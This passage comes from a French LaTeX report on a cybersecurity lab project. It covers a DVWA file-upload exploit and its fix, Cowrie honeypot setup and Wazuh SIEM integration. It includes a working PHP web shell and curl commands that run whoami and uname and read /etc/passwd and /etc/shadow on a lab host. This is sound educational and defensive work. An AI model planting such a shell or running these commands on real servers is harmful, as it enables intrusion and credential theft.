		\begin{itemize}
			\item Exécution de code arbitrary au niveau système
			\item Installation de backdoors persistants
			\item Vol de données confidentielles
			\item Compromission complète du serveur
		\end{itemize}
	\end{tcolorbox}
	
	\subsubsection{Screenshot}
	
	\begin{figure}[H]
		\centering
		\includegraphics[width=0.95\textwidth]{file-upload.png}
		\caption{File Upload - Web Shell Uploadé avec Succès}
		\label{fig:file-upload}
	\end{figure}
	
	\subsubsection{Remédiation}
	
	\begin{lstlisting}[language=php,caption=Upload Sécurisé]
		// Whitelist d'extensions autorisées
		$allowed = array('jpg', 'jpeg', 'png', 'gif', 'pdf');
		$filename = basename($_FILES['file']['name']);
		$ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
		
		if (!in_array($ext, $allowed)) {
			die("Extension de fichier non autorisée!");
		}
		
		// Vérifier le type MIME
		$finfo = finfo_open(FILEINFO_MIME_TYPE);
		$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);
		$allowed_mimes = array('image/jpeg', 'image/png', 'image/gif', 'application/pdf');
		
		if (!in_array($mime, $allowed_mimes)) {
			die("Type MIME non autorisé!");
		}
		
		// Stocker EN DEHORS du répertoire web
		$upload_dir = '/var/uploads/secure/'; // Hors de /var/www/html
		move_uploaded_file($_FILES['file']['tmp_name'], 
		$upload_dir . uniqid() . '.' . $ext);
	\end{lstlisting}

\subsection{Persistance via Web Shell}
\label{subsec:webshell-persistence}

\subsubsection{Concept et Danger}

Un \textbf{web shell} est un script malveillant (PHP, ASP, JSP, etc.) uploadé sur un serveur web vulnérable, permettant à un attaquant d'exécuter des commandes OS via une interface HTTP. La persistance est assurée car le fichier reste sur le serveur même après une déconnexion.

\subsubsection{Création du Web Shell}

Suite à l'exploitation de la vulnérabilité File Upload (A08), un web shell PHP minimal a été déposé sur le serveur :

\begin{lstlisting}[caption=Web shell PHP minimal --- shell.php]
<?php
// Web shell minimaliste
if(isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    $output = shell_exec($cmd . ' 2>&1');
    echo "<pre>" . htmlspecialchars($output) . "</pre>";
}
?>
\end{lstlisting}

\subsubsection{Accès et Utilisation}

Une fois uploadé, le web shell est accessible via :

\begin{lstlisting}[caption=Utilisation du web shell via HTTP,basicstyle=\ttfamily\footnotesize]
# Vérification de l'accès

# Résultat attendu : uid=33(www-data) gid=33(www-data) groups=33(www-data)

# Énumération du système
curl "http://192.168.100.6/dvwa/hackable/uploads/shell.php?cmd=whoami"
curl "http://192.168.100.6/dvwa/hackable/uploads/shell.php?cmd=hostname"
curl "http://192.168.100.6/dvwa/hackable/uploads/shell.php?cmd=uname+-a"

# Lecture de fichiers sensibles
curl "http://192.168.100.6/dvwa/hackable/uploads/shell.php?cmd=cat+/etc/passwd"
curl "http://192.168.100.6/dvwa/hackable/uploads/shell.php?cmd=cat+/etc/shadow"
\end{lstlisting}

\chapter{Cowrie SSH Honeypot --- Détection d'Attaques par Honeypot}
\label{chap:cowrie}

\begin{tcolorbox}[colback=primary!5!white, colframe=primary, title=\textbf{Objectifs du Chapitre}]
Ce chapitre documente la Phase 6 : déploiement d'un honeypot SSH de type Cowrie pour collecter et analyser les tentatives d'intrusion, mapper les techniques d'attaque selon MITRE ATT\&CK, et valider les attaques observées en Phase 3.
\end{tcolorbox}

\section{Introduction et Objectifs}

\subsection{Contexte et Motivation}

Un honeypot est un système intentionnellement vulnérable déployé pour observer les techniques, outils et comportements des attaquants dans un environnement contrôlé. Cowrie (Phase 6) capture les sessions SSH automatiquement, enrichissant les données collectées lors des simulations d'attaque de la Phase 3.

\textbf{Objectifs principaux :}
\begin{itemize}
    \item Déployer un honeypot SSH Cowrie (interaction faible/élevée) dans la DMZ
    \item Collecter les sessions d'attaque complètes au format JSON
    \item Analyser les comportements des attaquants (identifiants testés, commandes exécutées)
    \item Mapper les techniques observées selon le framework MITRE ATT\&CK
    \item Valider et enrichir les observations réalisées lors de la Phase 3
\end{itemize}

\section{Architecture et Déploiement Cowrie}

\subsection{Présentation de Cowrie}

Cowrie est un honeypot SSH/Telnet de medium interaction développé en Python. Il simule un serveur SSH vulnérable, accepte les connexions des attaquants, enregistre toutes leurs activités et génère des logs détaillés au format JSON. Cowrie peut opérer en deux modes :

\begin{itemize}
    \item \textbf{Mode shell (low interaction)} : Simule un système de fichiers et un shell basique, sans risque d'exposition réelle
    \item \textbf{Mode proxy (high interaction)} : Redirige les connexions vers un vrai système (backend) via SSH, capturant l'activité réelle tout en isolant le système de production
\end{itemize}

\subsection{Configuration du NAT et Port Forwarding}

Le déploiement nécessite une règle NAT sur pfSense pour rediriger le trafic SSH (port 22) de la zone WAN vers le honeypot Cowrie dans la DMZ. Le service SSH légitime du serveur Ubuntu est déplacé sur un port alternatif.

\begin{lstlisting}[language=bash, caption={Configuration SSH — Déplacement du port légitime}]
# Déplacer le service SSH légitime sur le port 2222 pour libérer le port 22 à Cowrie
sudo sed -i 's/^#\?Port .*/Port 2222/' /etc/ssh/sshd_config

sudo systemctl restart sshd

# Vérification — SSH légitime écoute désormais sur le port 2222
sudo ss -tlnp | grep sshd
\end{lstlisting}

\subsection{Installation et Démarrage de Cowrie}

\begin{lstlisting}[language=bash, caption={Installation de Cowrie dans la DMZ}]
# Installer les dépendances
sudo apt update && sudo apt install -y python3-venv python3-dev libssl-dev libffi-dev

# Créer un utilisateur dédié (sécurité)
sudo adduser --disabled-password cowrie

# Cloner Cowrie
sudo -u cowrie git clone https://github.com/cowrie/cowrie /home/cowrie/cowrie

# Créer l'environnement virtuel et installer les dépendances
cd /home/cowrie/cowrie
python3 -m venv cowrie-env
source cowrie-env/bin/activate
pip install --upgrade pip
pip install -r requirements.txt

# Configurer Cowrie (paramètres essentiels dans etc/cowrie.cfg)
cp etc/cowrie.cfg.dist etc/cowrie.cfg

# Paramètres clés à modifier :
# [honeypot]
#   hostname = svr04          <- Nom du système simulé affiché à l'attaquant
#   listen_port = 22          <- Port d'écoute Cowrie (22 si NAT ou 2222 si local)
#   interaction_type = low    <- 'low' (shell simulé) ou 'high' (proxy vers backend)
# [output_jsonlog]
#   enabled = true
#   logfile = ${honeypot:log_path}/cowrie.json  <- Logs JSON pour Wazuh/Filebeat

# Démarrer Cowrie
bin/cowrie start
bin/cowrie status
\end{lstlisting}

\chapter{Wazuh SIEM --- Analyse Intégrée et Réponse aux Incidents}
\label{chap:wazuh}

\begin{tcolorbox}[colback=primary!5!white, colframe=primary, title=\textbf{Objectifs du Chapitre}]
Ce chapitre documente la Phase 7 : intégration d'une plateforme SIEM (Wazuh) pour agréger les logs de pfSense, Snort, Cowrie, et agents Ubuntu. Nous y démontrons la corrélation d'événements, la détection d'attaques multi-étapes, et la réponse automatisée par blocage IP.
\end{tcolorbox}

\section{Introduction et Objectifs}

\subsection{Contexte : Du Monitoring à la Corrélation}

Wazuh agrège les événements des six phases précédentes (pfSense syslog, alertes Snort, sessions Cowrie JSON, journaux Ubuntu) pour une détection centralisée et une réponse automatisée. Là où chaque outil voit une partie de l'attaque, le SIEM corrèle la chaîne complète.

\textbf{Objectifs principaux :}
\begin{itemize}
    \item Déployer Wazuh Manager et ses agents sur l'infrastructure existante
    \item Ingérer les logs de pfSense (syslog), Snort (fast.log), Cowrie (JSON) et Ubuntu (journald)
    \item Configurer des règles de corrélation pour détecter les chaînes d'attaque multi-étapes
    \item Mettre en place une réponse active : blocage IP automatique via pfSense
    \item Démontrer la valeur ajoutée d'une approche SIEM dans un contexte de sécurité offensive/défensive
\end{itemize}

\section{Architecture Wazuh}

\subsection{Composants Principaux}

L'architecture Wazuh repose sur plusieurs composants interdépendants :

\begin{itemize}
    \item \textbf{Wazuh Manager} : Serveur central qui reçoit, analyse et corrèle les événements de sécurité
    \item \textbf{Wazuh Agents} : Installés sur les machines surveillées (Ubuntu DMZ, Windows XP), remontent les logs locaux
    \item \textbf{Filebeat} : Collecteur de logs léger pour les sources sans agent natif (pfSense, Cowrie)
    \item \textbf{OpenSearch/Elasticsearch} : Moteur d'indexation et de stockage des alertes
    \item \textbf{OpenSearch Dashboards} : Interface graphique pour la visualisation et l'investigation
\end{itemize}

\section{Configuration des Agents et Ingestion de Logs}

\subsection{Agent Ubuntu --- Logs Système}

\begin{lstlisting}[language=bash, caption={Installation de l'agent Wazuh sur Ubuntu DMZ}]
# Télécharger et installer l'agent Wazuh
curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | apt-key add -
echo "deb https://packages.wazuh.com/4.x/apt/ stable main" | tee /etc/apt/sources.list.d/wazuh.list
apt update && apt install -y wazuh-agent

# Configurer l'adresse du Manager
sed -i 's/MANAGER_IP/192.168.20.200/' /var/ossec/etc/ossec.conf

# Démarrer l'agent
systemctl enable wazuh-agent
systemctl start wazuh-agent
\end{lstlisting}

\subsection{Intégration pfSense --- Logs Syslog}

pfSense est configuré pour envoyer ses logs syslog vers le Wazuh Manager. Sur pfSense, dans \textbf{Status → System Logs → Settings}, configurer le serveur syslog distant avec l'IP du Wazuh Manager et le port 514 (UDP).

\subsection{Intégration Snort --- Fast Logs}

Les alertes Snort générées dans \texttt{/var/log/snort/alert} sont collectées via Filebeat et envoyées au Wazuh Manager pour corrélation avec les autres sources.

\subsection{Intégration Cowrie --- JSON Sessions}

Les sessions Cowrie au format JSON sont ingérées via Filebeat avec un module de parsing dédié qui extrait les champs IP source, credentials testés, commandes exécutées et mappings MITRE.

\section{Règles de Corrélation et Détection}

Les règles de corrélation Wazuh permettent de détecter des séquences d'événements caractéristiques d'une attaque multi-étapes. Par exemple :

\begin{enumerate}
    \item Détection d'un scan Nmap (Snort alerte sur les sondes TCP SYN)
    \item Tentatives de brute-force SSH (Cowrie enregistre les credentials)
    \item Connexion réussie et exécution de commandes (agent Ubuntu journald)
    \item Pivot vers le LAN (pfSense logs de routage inter-zones)
\end{enumerate}

Une règle de corrélation XML Wazuh peut enchaîner ces événements sur une fenêtre temporelle pour générer une alerte de niveau critique.

\section{Réponse Active}

Wazuh supporte la réponse active via des scripts déclenchés automatiquement en réponse à des alertes de haute sévérité. Dans notre contexte, un script de blocage IP interagit avec l'API pfSense pour ajouter l'adresse IP attaquante à une liste de blocage dynamique, interrompant immédiatement toute communication depuis cette source.

\begin{lstlisting}[language=bash, caption={Script de réponse active — Blocage IP via pfSense API}]
#!/bin/bash
# Script de réponse active Wazuh - Blocage IP pfSense
# Déclenché automatiquement pour les alertes niveau >= 10

ATTACKER_IP="$1"
PFSENSE_API="https://192.168.20.1/api/v1/firewall/rule"
TOKEN="$(cat /etc/wazuh/pfsense-token)"

curl -s -X POST "$PFSENSE_API" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"type\":\"block\",\"src\":\"$ATTACKER_IP\",\"descr\":\"Wazuh Auto-Block\"}"

logger "Wazuh Active Response: Blocked $ATTACKER_IP on pfSense"
\end{lstlisting}

\section{Conclusion}

Wazuh agrège les logs des sept phases (pfSense, Snort, Cowrie, agents Ubuntu) pour offrir une visibilité complète sur la chaîne d'attaque. Les perspectives d'évolution : intégration SOAR et architecture Zero Trust.

\section{Glossaire Technique}

\begin{description}[leftmargin=3cm, style=nextline]
    \item[CVE] \textit{Common Vulnerabilities and Exposures} — Identifiant standardisé pour les vulnérabilités connues.
    \item[CVSS] \textit{Common Vulnerability Scoring System} — Système de notation de sévérité des vulnérabilités (0–10).
    \item[DMZ] \textit{Demilitarized Zone} — Zone réseau intermédiaire entre WAN et LAN, hébergeant les services exposés.
    \item[DPI] \textit{Deep Packet Inspection} — Analyse du contenu des paquets (couche 7), au-delà des en-têtes IP/TCP.
    \item[IDS] \textit{Intrusion Detection System} — Système de détection d'intrusion passif (alerte uniquement).
    \item[IPS] \textit{Intrusion Prevention System} — Système de prévention d'intrusion actif (blocage).
    \item[IOC] \textit{Indicator of Compromise} — Artefact observable indiquant une compromission.
    \item[LFI] \textit{Local File Inclusion} — Vulnérabilité permettant l'inclusion de fichiers locaux.
    \item[MITRE ATT\&CK] Référentiel de tactiques et techniques d'attaque observées dans la réalité.
    \item[NAT] \textit{Network Address Translation} — Traduction d'adresses réseau entre interfaces.
    \item[OWASP] \textit{Open Web Application Security Project} — Organisation définissant les standards de sécurité web.
    \item[Payload] Code malveillant exécuté après exploitation d'une vulnérabilité.
    \item[Pivoting] Technique utilisant une machine compromise comme relais pour atteindre des réseaux internes.
    \item[RCE] \textit{Remote Code Execution} — Exécution de code arbitraire à distance.
    \item[SQLi] \textit{SQL Injection} — Injection de code SQL malveillant dans une requête.
    \item[XSS] \textit{Cross-Site Scripting} — Injection de scripts malveillants dans une page web.
\end{description}
